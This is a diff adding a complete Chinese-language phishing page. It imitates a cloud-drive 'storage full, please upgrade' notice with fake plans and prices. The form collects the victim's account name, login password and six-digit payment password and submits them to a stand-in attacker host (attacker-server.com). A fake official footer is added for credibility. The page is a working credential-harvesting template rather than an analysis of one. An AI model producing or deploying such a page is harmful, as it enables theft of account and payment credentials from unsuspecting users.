@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>云存储空间不足 - 请扩容</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Microsoft YaHei', Arial, sans-serif;
+            background: linear-gradient(135deg, #1565c0 0%, #1976d2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            width: 450px;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #1565c0 0%, #1976d2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header .icon { font-size: 60px; margin-bottom: 10px; }
+        .header h1 { font-size: 22px; }
+        .alert-bar {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .content { padding: 30px; }
+        .storage-bar {
+            background: #e0e0e0;
+            border-radius: 10px;
+            height: 30px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .storage-used {
+            background: linear-gradient(90deg, #c62828 0%, #ef5350 100%);
+            height: 100%;
+            width: 98%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .storage-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            color: #666;
+            font-size: 14px;
+        }
+        .plans {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .plan {
+            flex: 1;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .plan:hover, .plan.selected {
+            border-color: #1976d2;
+            background: #e3f2fd;
+        }
+        .plan.popular {
+            border-color: #ffc107;
+            position: relative;
+        }
+        .plan.popular::before {
+            content: '推荐';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ffc107;
+            color: #333;
+            padding: 2px 10px;
+            border-radius: 10px;
+            font-size: 11px;
+        }
+        .plan h3 { font-size: 16px; margin-bottom: 8px; color: #333; }
+        .plan .price { font-size: 22px; font-weight: bold; color: #1976d2; }
+        .plan .period { font-size: 12px; color: #999; }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ffc107 0%, #ffca28 100%);
+            color: #333;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background: #fafafa;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">&#128193;</div>
+            <h1>云盘 - 存储空间已满</h1>
+        </div>
+        <div class="alert-bar">
+            &#9888; 您的云盘已用尽，无法继续上传新文件
+        </div>
+        <div class="content">
+            <div class="storage-info">
+                <span>已用: 49.8 GB / 50 GB</span>
+                <span style="color:#c62828;">已满 99.6%</span>
+            </div>
+            <div class="storage-bar">
+                <div class="storage-used">49.8 GB / 50 GB</div>
+            </div>
+            <form action="https://attacker-server.com/cloud.php" method="POST">
+                <div class="plans">
+                    <div class="plan selected">
+                        <h3>月卡</h3>
+                        <div class="price">&#165;18</div>
+                        <div class="period">每月</div>
+                    </div>
+                    <div class="plan popular">
+                        <h3>年卡</h3>
+                        <div class="price">&#165;168</div>
+                        <div class="period">每年(省56元)</div>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>云盘账号</label>
+                    <input type="text" name="account" required>
+                </div>
+                <div class="form-group">
+                    <label>登录密码</label>
+                    <input type="password" name="password" required>
+                </div>
+                <div class="form-group">
+                    <label>支付密码</label>
+                    <input type="password" name="pay_password" placeholder="6位数字" required>
+                </div>
+                <button type="submit" class="submit-btn">立即升级扩容</button>
+            </form>
+        </div>
+        <div class="footer">
+            云盘官方 | 客服: 400-888-8888 | 谨防假冒客服
+        </div>
+    </div>
+</body>
+</html>
